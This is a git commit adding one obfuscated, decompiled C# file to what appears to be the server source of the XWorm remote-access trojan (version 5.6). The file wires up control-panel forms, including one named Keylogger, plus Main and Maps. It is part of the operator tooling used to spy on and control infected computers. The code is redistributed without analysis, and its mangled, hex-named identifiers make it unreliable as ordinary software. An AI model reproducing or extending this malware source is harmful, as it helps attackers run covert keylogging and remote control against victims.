0e192ec2136f4118331e79cb28a817110eeda211
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:48 +0400

    Forms35.cs

---
+++ XWorm V5.6/Server/Forms/Forms35.cs
@@ -0,0 +1,46 @@
+﻿using B6BDBEBB1AD5AC7B02AD8B38A43A72C5;
+using F39DE5AD04FF3A9A69F65338FD1F0D2E;
+using FB656BD0FD55CB0EE5FF3EDFB047FABD;
+using FFB66A26FC1341BC826245CBB0547176;
+using IF0FF1FFB1CA752C08C9910B024F129F;
+using System;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+
+namespace IF7ECB736801D875D48E6C65CE1BIEF6
+{
+  public class I2F88ED16A41I5FEI8E9B06BFCAF5E96
+  {
+    public static int PEAA12D93C14D49976C74F1CDCAB4BAF;
+
+    public string type
+    {
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get => throw new Exception("の");
+      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.NoInlining)] set => throw new Exception("び");
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public FEF8FF7D293AAB267C8CCA32BEF745E8 get_Keylogger()
+    {
+      ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Keylogger = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<FEF8FF7D293AAB267C8CCA32BEF745E8>(((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Keylogger);
+      return ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Keylogger;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public A826E7E6B94ECA8BC1F49B4A06F81E1F get_Main()
+    {
+      ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Main = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<A826E7E6B94ECA8BC1F49B4A06F81E1F>(((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Main);
+      return ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Main;
+    }
+
+    [DebuggerHidden]
+    [SpecialName]
+    public B6FB0CC1B41FC688D3DEBB778F4D6A19 get_Maps()
+    {
+      ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Maps = IA0AD4B699F26I4B2F7CFCF52I427780.Create__Instance__<B6FB0CC1B41FC688D3DEBB778F4D6A19>(((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Maps);
+      return ((E8AC5898DDA66BCEB297A63FD977EA10) this).m_Maps;
+    }
+  }
+}
